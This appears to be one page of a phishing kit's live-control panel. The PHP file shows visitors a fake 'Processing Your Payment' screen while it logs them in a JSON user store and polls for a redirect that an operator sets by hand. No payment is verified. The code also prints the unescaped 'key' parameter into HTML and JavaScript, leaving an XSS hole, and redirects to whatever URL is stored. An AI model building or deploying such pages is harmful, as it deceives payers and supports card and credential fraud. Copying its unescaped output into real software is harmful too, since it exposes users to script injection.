<?php
// waitingPay.php
session_start();
$user_key = $_GET['key'] ?? ($_SESSION['user_key'] ?? '');
if (empty($user_key)) {
    header("Location: index.php");
    exit();
}

// Load users database
$users_file = 'data/users.db';
$users = file_exists($users_file) ? json_decode(file_get_contents($users_file), true) : [];

// Update user status to "waiting_payment"
if (isset($users[$user_key])) {
    $users[$user_key]['status'] = 'waiting_payment';
    $users[$user_key]['current_page'] = 'waitingPay.php';
    $users[$user_key]['last_seen'] = time();
    $users[$user_key]['last_updated'] = time();
    
    // Add to history
    $users[$user_key]['history'][] = [
        'time' => time(),
        'action' => 'waiting_for_admin',
        'page' => 'waitingPay.php'
    ];
    
    file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT));
}

// Check if admin has set a redirect
$redirect_to = $users[$user_key]['redirect_to'] ?? '';
if (!empty($redirect_to) && $redirect_to !== 'waitingPay.php') {
    header("Location: " . $redirect_to);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing Payment</title>
    <link rel="stylesheet" href="style.css">
    <style>
    .waiting-container {
        max-width: 600px;
        margin: 50px auto;
        text-align: center;
    }
    .loader {
        border: 5px solid #f3f3f3;
        border-top: 5px solid #4a6cf7;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .user-id {
        background: #f8f9fa;
        padding: 10px;
        border-radius: 5px;
        margin: 20px 0;
        font-family: monospace;
        word-break: break-all;
    }
    .info-box {
        background: #e7f3ff;
        border-left: 4px solid #4a6cf7;
        padding: 15px;
        margin: 20px 0;
        text-align: left;
        border-radius: 0 5px 5px 0;
    }
    </style>
</head>
<body>
    <div class="container">
        <div class="waiting-container">
            <div class="loader"></div>
            <h2>Processing Your Payment</h2>
            <p>We are verifying your payment details. This may take a few moments.</p>
            
            <div class="user-id">
                <strong>Your ID:</strong> <?php echo $user_key; ?>
            </div>
            
            <div class="info-box">
                <p><strong>📌 Important:</strong></p>
                <p>Your payment is being reviewed. Please keep this page open.</p>
                <p>You will be automatically redirected when the process is complete.</p>
            </div>
            
            <div id="countdown">Checking status...</div>
            
            <p style="margin-top: 30px; color: #666; font-size: 0.9em;">
                Do not refresh or close this page.
            </p>
        </div>
    </div>
    
    <script>
    const userKey = "<?php echo $user_key; ?>";
    let checkCount = 0;
    const maxChecks = 180; // 3 minutes (180 checks × 1 second)
    
    function checkStatus() {
        checkCount++;
        if (checkCount > maxChecks) {
            document.getElementById('countdown').innerHTML = 
                "⏰ Timeout - Please contact support.";
            return;
        }
        
        document.getElementById('countdown').innerHTML = 
            "⏳ Checking (" + checkCount + "/" + maxChecks + ")...";
        
        fetch('checkUserStatus.php?key=' + userKey)
            .then(response => response.json())
            .then(data => {
                if (data.redirect && data.redirect !== '' && data.redirect !== 'waitingPay.php') {
                    window.location.href = data.redirect;
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        
        // Check every second
        setTimeout(checkStatus, 1000);
    }
    
    // Start checking
    setTimeout(checkStatus, 2000);
    </script>
</body>
</html>
